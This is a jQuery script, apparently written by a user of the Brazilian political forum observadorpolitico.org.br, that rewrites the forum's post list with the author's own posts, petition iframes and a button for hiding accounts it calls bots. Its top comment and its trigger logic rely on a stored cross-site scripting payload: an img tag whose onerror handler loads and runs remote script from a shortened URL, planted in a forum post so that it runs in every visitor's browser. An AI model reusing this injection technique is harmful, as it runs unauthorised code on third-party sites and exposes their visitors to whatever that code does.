/*

$(".post:eq(1) h3 a").prepend('   <img height=0 src=æ onerror=$.ajaxSetup({cache:true});$.getScript(&#39//goo.gl/6NNQQ&#39)>  ');

-------------------------------------------------

{cat:"",titulo:"",metas:"",url:"",img:"",p:0},

<a href='' class='author'>Por Fulano</a>, <span class='data'>mm/dd/yyyy às hh:mm</span> <a href='' class='comments' title=''> / opine </a>

*/

$(document).ready(function(){

if ($('.allBlogs').html()!=null){

var 

info =[



{cat:"L",titulo:'<div class="post"> <div class="text"> <p class="cat" style="">Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter Twitter</p> <h3><a href="http://www.observadorpolitico.org.br/grupos/tecnologia/forum/topic/twitter"><img src="http://i.imgur.com/IceSJlEm.jpg" alt="" class="avatar user-2016-avatar" style=" width: 200px; height: 60px; float: left;">Quer comentar e a AdOP não dá? Usa este post pra Twittar dentro do OP . </a></h3> <p class="metas"><a href="http://www.observadorpolitico.org.br/observadores/" class="author">Por Obi Ser Vando</a>, <span class="data">20/06/2013 às 19:38</span> <a href="http://www.observadorpolitico.org.br/grupos/tecnologia/forum/topic/twitter/#comments" class="comments" title="Use este post pra twittar rapidamente no OP"> / Twitta </a> </p></div><div class="clear"></div></div><div class="post" style=" background: 155% 50% no-repeat URL(http://avaazdo.s3.amazonaws.com/473819f0b09ca15c2357ed9fa3108570.jpg);"><div style="width:700px;height:40px;overflow:hidden"><iframe style="left: -10px;position:relative;top:-560px;width:710px;height:760px;overflow: hidden;" src="http://www.avaaz.org/po/petition/Convencer_senadores_a_rejeitarem_a_PEC_372011_que_limita_o_poder_de_investigacao_do_Ministerio_Publico/" scrolling="no"></iframe></div><div class="text"> <p class="metas"><a href="http://www.avaaz.org/po/petition/Convencer_senadores_a_rejeitarem_a_PEC_372011_que_limita_o_poder_de_investigacao_do_Ministerio_Publico/" class="comments">...rejeitarem a PEC 37/2011, que limita o poder de investigação do MP.</a> </p></div><div class="clear"></div></div>',metas:"",url:"",img:"",p:0},

{cat:"L",titulo:'<div class="post" style=" background: 120% 80% no-repeat URL(http://i.imgur.com/ijxalzSm.jpg);"><div style="width:700px;height:40px;overflow:hidden"><iframe  style="left: -10px;position:relative;top:-500px;width:710px;height:560px;overflow: hidden;" src="//goo.gl/b3yIu" scrolling="no"></iframe></div><div class="text"> <p class="metas"><a href="http://www.avaaz.org/po/petition/Impeachment_da_Presidente_Dilma_1/" class="comments">http://www.avaaz.org/po/petition/Impeachment_da_Presidente_Dilma_1/</a> </p></div><div class="clear"></div></div><div class="post"> <div class="text"><div style="height:60px;width:700px;overflow:hidden"><iframe src="http://incluaamornabandeira.org" style="left: -20px;position:relative;top: -545px;width: 736px;height: 700px;overflow: hidden;" scrolling="no"></iframe></div><p class="cat">também</p><p class="metas" style="float:right;margin-top: -30px;margin-right: -20px;"><a href="http://incluaamornabandeira.org/" class="comments"><span style=" "><span>Inclua<strong><span style="color: #008000;">Amor</span></strong>NaBandeira.org</span></span></a></p></div><div class="clear"></div></div>',metas:"",url:"",img:"",p:0},

{cat:"L",titulo:'<div class="post"> <a href="http://www.observadorpolitico.org.br/grupos/opiniao/forum/topic/e-nisso-que-da-um-pais-sem-oposicao-ela-acaba-sendo-feita-na-rua-entenderam-mauricinhos-do-psdb"><img src="http://www.observadorpolitico.org.br/wp-content/uploads/avatars/8149/9d9397f90a1011a3232df4dd607a1a4b-bpthumb.jpg" alt="" class="avatar user-8149-avatar" width="60" height="60"></a><div class="text"> <p class="cat">opiniao</p> <h3><a href="http://www.observadorpolitico.org.br/grupos/opiniao/forum/topic/e-nisso-que-da-um-pais-sem-oposicao-ela-acaba-sendo-feita-na-rua-entenderam-mauricinhos-do-psdb">É nisso que dá um país sem oposição: ela acaba sendo feita na rua. Entenderam, mauricinhos do PSDB?</a></h3> <p class="metas"><a href="http://www.observadorpolitico.org.br/observadores/" class="author">Por Ricardo Froes</a>, <span class="data">21/06/2013 às 09:55</span> <a href="http://www.observadorpolitico.org.br/grupos/opiniao/forum/topic/e-nisso-que-da-um-pais-sem-oposicao-ela-acaba-sendo-feita-na-rua-entenderam-mauricinhos-do-psdb/#comments" class="comments" title="É nisso que dá um país sem oposição: ela acaba sendo feita na rua. Entenderam, mauricinhos do PSDB?"> / opine </a> </p></div><div class="clear"></div></div><div class="post"> <a href="http://www.observadorpolitico.org.br/grupos/opiniao/forum/topic/op-na-hora-h-vai-contra-o-momento-historico"><img src="http://www.observadorpolitico.org.br/wp-content/uploads/avatars/2846/15d7974d46c909c9be3d7cea65bce469-bpthumb.jpg" alt="" class="avatar user-2846-avatar" width="60" height="60"></a> <div class="text"> <p class="cat">opiniao</p> <h3><a href="http://www.observadorpolitico.org.br/grupos/opiniao/forum/topic/op-na-hora-h-vai-contra-o-momento-historico">OP na hora "H" vai contra o momento histórico...</a></h3> <p class="metas"><a href="http://www.observadorpolitico.org.br/observadores/" class="author">Por erikssom patos </a>, <span class="data">18/06/2013 às 10:18</span> <a href="http://www.observadorpolitico.org.br/grupos/opiniao/forum/topic/op-na-hora-h-vai-contra-o-momento-historico/#comments" class="comments" title="OP na hora " h"="" vai="" contra="" o="" momento="" histórico..."=""> / opine </a> </p> </div> <div class="clear"></div> </div><div class="post"> <a href="http://www.observadorpolitico.org.br/grupos/opiniao/forum/topic/licao-das-ruas-aos-tucanos-em-5-frases"><img src="http://www.observadorpolitico.org.br/wp-content/uploads/avatars/8862/0a924a0aa0d7a90ef2129d92b21d70de-bpthumb.jpg" alt="" class="avatar user-8862-avatar" width="60" height="60"></a> <div class="text"> <p class="cat">opiniao</p> <h3><a href="http://www.observadorpolitico.org.br/grupos/opiniao/forum/topic/licao-das-ruas-aos-tucanos-em-5-frases">Lição das ruas aos tucanos em 5 frases</a></h3> <p class="metas"><a href="http://www.observadorpolitico.org.br/observadores/" class="author">Por Papa Tango</a>, <span class="data">18/06/2013 às 12:19</span> <a href="http://www.observadorpolitico.org.br/grupos/opiniao/forum/topic/licao-das-ruas-aos-tucanos-em-5-frases/#comments" class="comments" title="Lição das ruas aos tucanos em 5 frases"> / opine </a> </p> </div> <div class="clear"></div> </div><div class="post"> <a href="http://www.observadorpolitico.org.br/2013/06/entenda-um-so-um-dos-motivos-das-manifestacoes"><img src="http://www.observadorpolitico.org.br/wp-content/uploads/avatars/1880/437eb20408fd2e042ae566917f59a0de-bpthumb.jpg" alt="" class="avatar user-1880-avatar" width="60" height="60"></a> <div class="text"> <p class="cat">opiniao</p> <h3><a href="http://www.observadorpolitico.org.br/2013/06/entenda-um-so-um-dos-motivos-das-manifestacoes">Entenda um (só um) dos motivos das manifestações.</a></h3> <p class="metas"><a href="http://www.observadorpolitico.org.br/observadores/" class="author">Por José Antônio da Conceição</a>, <span class="data">18/06/2013 às 13:08</span> <a href="http://www.observadorpolitico.org.br/2013/06/entenda-um-so-um-dos-motivos-das-manifestacoes/#comments" class="comments" title="Entenda um (só um) dos motivos das manifestações."> / opine </a> </p> </div> <div class="clear"></div> </div><div class="post"><a href="http://www.observadorpolitico.org.br/grupos/brasil/forum/topic/nao-precisamos-da-copa-e-nem-das-olimpiadas"><img src="http://www.gravatar.com/avatar/6e116053aacbe3605e1461efc5eb1448?d=http://www.observadorpolitico.org.br/wp-content/plugins/buddypress/bp-core/images/mystery-man.jpg&amp;s=60" alt="" class="avatar user-333-avatar" width="60" height="60"></a><div class="text"><p class="cat">brasil</p><h3><a href="http://www.observadorpolitico.org.br/grupos/brasil/forum/topic/nao-precisamos-da-copa-e-nem-das-olimpiadas">Não precisamos da Copa e nem das Olimpíadas.</a></h3><p class="metas"><a href="http://www.observadorpolitico.org.br/observadores/" class="author">Por mario jota</a>,<span class="data">18/06/2013 às 16:38</span><a href="http://www.observadorpolitico.org.br/grupos/brasil/forum/topic/nao-precisamos-da-copa-e-nem-das-olimpiadas/#comments" class="comments" title="Não precisamos da Copa e nem das Olimpíadas.">/ opine</a></p></div><div class="clear"></div></div>',metas:"",url:"",img:"",p:0},



{cat:"Communication ",titulo:"O site observadorpolitico.org.br está com os comentários desativados.",metas:"Participe <button type=\"button\" onclick=\"document.getElementById('forum_embed').style.height='560px';document.getElementById('forum_embed').src ='https://groups.google.com/forum/embed/?place=forum/opmais&showsearch=false&showpopout=true&showtabs=false&theme=default&hideforumtitle=true&parenturl=https%3A%2F%2Fgroups.google.com%2Fforum%2F';\">Fórum </button> &bull; <button type=\"button\" onclick=\"document.getElementById('forum_embed').style.height='560px';document.getElementById('forum_embed').src ='http://opsbr.chatango.com/group';\">Bate-Papo</button> &bull; <a href=https://sites.google.com/site/backuppolitico/home target=_blank><button type=button>OP Alternativo</button></a> &bull; <a href=http://www.observadorpolitico.org.br/grupos/internet/forum/topic/participem-desta-campanha target=_blank><button type=button>Campanha</button></a><br><a href='' class='author'>Sugestão:</a> Publique seu artigo no OP e indique link de site externo para receber comentários <span class='data'></span> <a href='http://www.observadorpolitico.org.br/grupos/comunicacao/forum/topic/o-site-observadorpolitico-org-br-esta-com-os-comentarios-desativados' class='comments' title=''> / +dicas </a><iframe id=\"forum_embed\" src=\"javascript:void(0)\" style=\"width:100%;height:0px;\"></iframe> ",url:"http://www.observadorpolitico.org.br/grupos/comunicacao/forum/topic/o-site-observadorpolitico-org-br-esta-com-os-comentarios-desativados",img:"http://i.imgur.com/IWi48drs.jpg?1",p:0},

  
 {cat:"R",titulo:"PROPAGANDA ELEITORAL DO PSDB",p:0},
 
 {cat:"",titulo:"Aécio Neves e o Spam", metas:"<a href='' class='author'>Por Obi Ser Vando</a>, <span class='data'> 14/05/2013 às 02:09  </span> <a href='http://www.observadorpolitico.org.br/grupos/comunicacao/forum/topic/aecio-neves-e-o-spam/#comments' class='comments' title=''> / 15+opi.s </a>",url:"http://www.observadorpolitico.org.br/grupos/comunicacao/forum/topic/aecio-neves-e-o-spam", img:"http://i.imgur.com/kBQIu5H.jpg?1",p:0},

{cat:"",titulo:"<button id=\"norobot\" type=\"button\" onclick=\"$('.detailSeta').click();$(this).hide();$('.boxBlue p').append('sem_robôs');int=setInterval(function(){$('.post:has(.user-9463-avatar,.user-9458-avatar,.user-7268-avatar,#norobot)').hide()},3000)\" >Clique aqui para ocultar robôs Barbara, Juca e Braulio</button> <button type=\"button\" onclick=\"$('.detailSeta').click();$(this).hide();$('.boxBlue p').append('_E');int2=setInterval(function(){$('.post:has(.user-8993-avatar,)').hide()},3000)\" >Elton</button>",metas:"Dicas: clique no botão [Mais recentes] para atualizar a lista de discussões e manter o script funcionando;<br>Clique com o botão direito no link ou título da discussão e escolha abrir em uma nova guia ou janela;<br>Numa alternativa ao uso dos botões de ocultar, experimente o botão [Mais discutidas] —somente as postagens que tem comentários aparecem na lista. <a href=\"http://www.observadorpolitico.org.br/grupos/tecnologia/forum/topic/ocultar-postagens-na-lista-de-discussao\">[+Dicas]</a>",url:"",img:"http://i.imgur.com/sbaWUoQs.jpg",p:0},

  
 {cat:"",titulo:"PT♥PSDB: PerFeitos um para o outro.", metas:"<a href='' class='author'>Por Obi Ser Vando</a>, <span class='data'> em 20/04/2013 às 11:14 </span> <a href='http://www.observadorpolitico.org.br/grupos/cultura/forum/topic/pt%e2%99%a5psdb-perfeitos-um-para-o-outro/#comments' class='comments' title=''> / opinar </a>",url:"http://www.observadorpolitico.org.br/grupos/cultura/forum/topic/pt%e2%99%a5psdb-perfeitos-um-para-o-outro/", img:"http://3.bp.blogspot.com/-IUhQMxTvQls/T3RwAx1rumI/AAAAAAAAFh0/FhjAmA58xbg/s60/PSDB+COM+PT.jpg",p:0},

{cat:"",titulo:"10 Estratégias de Manipulação Midiática", metas:"<a href='' class='author'>Por Obi Ser Vando</a>, <span class='data'> em 22/04/2013 às 14:40  </span> <a href='http://www.observadorpolitico.org.br/grupos/comunicacao/forum/topic/10-estrategias-de-manipulacao-midiatica/#comments' class='comments' title=''> / opinar </a>",url:"http://www.observadorpolitico.org.br/grupos/comunicacao/forum/topic/10-estrategias-de-manipulacao-midiatica/", img:"http://4.bp.blogspot.com/_GrBPCsNjVJQ/TSMJKrKyJjI/AAAAAAAAAqA/Pk_Dj6mxaBw/s60/aten%25C3%25A7%25C3%25A3o_manipula%25C3%25A7%25C3%25A3o.png",p:0},

  {cat:"",titulo:"MÍDIA ESCONDE PROCESSO CONTRA AÉCIO", metas:"<a href='' class='author'>Por lauro esteves</a>, <span class='data'> em 11/04/2013 às 11:57  </span> <a href='http://www.observadorpolitico.org.br/grupos/eleicoes-2/forum/topic/midia-esconde-processo-contra-aecio/#comments' class='comments' title=''> / opinar </a>",url:"http://www.observadorpolitico.org.br/grupos/eleicoes-2/forum/topic/midia-esconde-processo-contra-aecio/", img:"http://i.imgur.com/Bkff2xns.jpg",p:0},


  {cat:"R",titulo:"O uso de robôs para manipular e direcionar a opinião nas redes?",p:0},
  {cat:"R",titulo:"Uma prece pela paz.",p:0},
  {cat:"R",titulo:"SOJA – A não Trangênica",p:0},
  {cat:"R",titulo:"Educação/Ensino de qualidade social",p:0},
  
  {cat:"",titulo:"As palavras são a fonte menos confiável da Verdade.", metas:"<a href='' class='author'>Por Obi Ser Vando</a>, <span class='data'> em 17/04/2013 às 10:51 </span> <a href='http://www.observadorpolitico.org.br/grupos/comunicacao/forum/topic/informacao-a-imprensa-2/#comments' class='comments' title=''> /  opinar  </a>",url:"http://www.observadorpolitico.org.br/grupos/comunicacao/forum/topic/informacao-a-imprensa-2/", img:"https://lh5.googleusercontent.com/-VyrEnxqEApk/USCjgllGgPI/AAAAAAAABNY/L5NyneX99qk/s100/StrawberriesHigh_29C5465.jpg",p:0},

  {cat:"",titulo:"Qual é a melhor escolha?", metas:"<a href='' class='author'>Por Obi Ser Vando</a>, <span class='data'> em 18/04/2013 às 11:06 </span> <a href='http://www.observadorpolitico.org.br/grupos/mundo-2/forum/topic/qual-e-a-melhor-escolha/#comments' class='comments' title=''> / opinar </a>",url:"http://www.observadorpolitico.org.br/grupos/mundo-2/forum/topic/qual-e-a-melhor-escolha/", img:"https://lh4.googleusercontent.com/-lR5gLLgckqE/TU1eYDeuqEI/AAAAAAAADzk/3CnpTzmpWIE/s100/Your%252520Choice%252520is%252520Your%252520Way.jpg",p:0},


  {cat:"R",titulo:"Tem algo a dizer？",p:0}


],

txtch = '<a href="#" style="position: absolute; top: -25px;color:#01acf1;font-weight: bold; right: 25px;z-index: 0;font-size: 80%;font-family: \'HelveticaLTStdBold\';text-align: center;width: 90px;">carregar mais<span style="position: absolute;top: -3px;  display: block; background: url(/wp-content/themes/gk/images/sprite.png) no-repeat -275px -218px; width: 90px; height: 30px;z-index: -1;"></span></a>' ,

$xx = $(".post:has([onerror*='gl/6NNQQ'])").removeClass().css("position","relative").html(txtch).click(function(e){


  e.preventDefault();


var i,z,txtpost;



for (i in info) {

  if( l==-2) {z=i } else if( l==-3){l=-2}  else if( l==-4){l=-3}  else if(i>l) {z=Math.floor((Math.random()*info.length)); if(z>l) i=z; } 

if( info[i].p!=0 )   continue;

  if(info[i].cat=="R") { txtpost = $('<div><p class="textLoading">Carregando...</p></div>').load('http://www.observadorpolitico.org.br/?s=' + encodeURI(info[i].titulo) + ' .post:last')} else if(info[i].cat=="L"){txtpost = info[i].titulo } else { txtpost = "<div class=\"post\"><a "+ info[i].url.replace(/.+/,"href=\""+info[i].url+"\"") +"><img "+ info[i].img.replace(/.+/,"src=\""+info[i].img+"\"") +" alt=\"\"class=\"avatar \" width=\"60\"height=\"60\"></a><div class=\"text\"><p class=\"cat\">"+info[i].cat+"</p><h3><a "+ info[i].url.replace(/.+/,"href=\""+info[i].url+"\"") +">"+info[i].titulo+"</a></h3><p class=\"metas\">"+info[i].metas+"</p></div><div class=\"clear\"></div></div>"}

$xx.before(txtpost); info[i].p=1

if(z!==undefined) break;

};
if (l==99 || info.length==1 ) $xx.remove();


});

var l=-0; $xx.click();l=99
}
});
